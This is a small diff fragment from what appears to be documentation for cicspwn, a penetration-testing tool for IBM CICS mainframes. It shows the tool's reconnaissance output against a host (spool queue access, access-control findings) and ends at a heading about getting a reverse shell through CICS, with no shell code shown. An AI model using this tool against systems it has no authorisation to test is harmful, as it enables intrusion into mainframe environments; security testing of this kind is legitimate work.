@@ -111,7 +111,7 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
 	[*] Transiant queue to access spool is apparently available
 		[*] When submitting a job, provide the option --inreader=IRDR
 [+] Access control
-	[*] User CICSUSER authorized to submit JOBS
+	[+] CICS uses an ESM (RACF/ACF2/TopSecret), might be tricky to access some functions
 ```
 ## Reverse shell using CICS
 ```
